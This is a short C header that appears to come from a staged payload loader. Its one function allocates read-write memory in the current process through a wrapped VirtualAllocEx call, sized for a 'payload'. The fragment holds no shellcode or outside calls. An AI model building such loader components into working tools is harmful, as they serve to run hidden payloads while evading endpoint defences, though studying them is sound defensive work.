#pragma once
#include "../../api/api_wrappers.h"
#include "../../core/utils.h"

LPVOID Stage2_Alloc_Local(int payloadSize) {

    LPVOID mem = MyVirtualAllocEx(
                    (HANDLE)-1,
                    NULL,
                    payloadSize,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE
                );

    #ifdef DEBUG_MODE
        if (mem) {
            DEBUG_MSG("Stage 2", "Allocated at: %p", mem);
        }
    #endif

    return mem;
}